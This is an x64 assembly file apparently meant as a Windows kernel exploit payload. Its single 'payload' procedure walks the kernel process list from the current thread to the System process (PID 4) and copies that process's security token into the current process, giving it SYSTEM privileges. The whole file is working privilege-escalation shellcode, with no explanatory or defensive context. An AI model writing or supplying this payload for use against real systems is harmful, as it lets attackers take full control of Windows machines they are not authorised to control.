code
payload proc
	; Save values of registers we use in case they are needed later in the returning function
	push rax
	push rcx
	push rdx

	; _KPCR -> _KPRCB -> _KTHREAD (current thread)
	xor rax, rax
	mov rax, gs:[rax + 188h]

	; _KTHREAD -> _EPROCESS
	mov rax, [rax + 70h]

	; Save the current thread and loop through the linked list of
	; thread for PID 4 (system process which runs as system)
	mov rcx, rax

CheckSystem:
	mov rax, [rax + 188h]
	sub rax, 188h
	cmp qword ptr [rax + 180h], 4
	jne CheckSystem

	; Copy the system security token to our current process to raise our privileges to system
	mov rax, [rax + 208h]
	mov [rcx + 208h], rax

	; Cleanup stack and return program execution
	pop rdx
	pop rcx
	pop rax
	ret
payload endp
end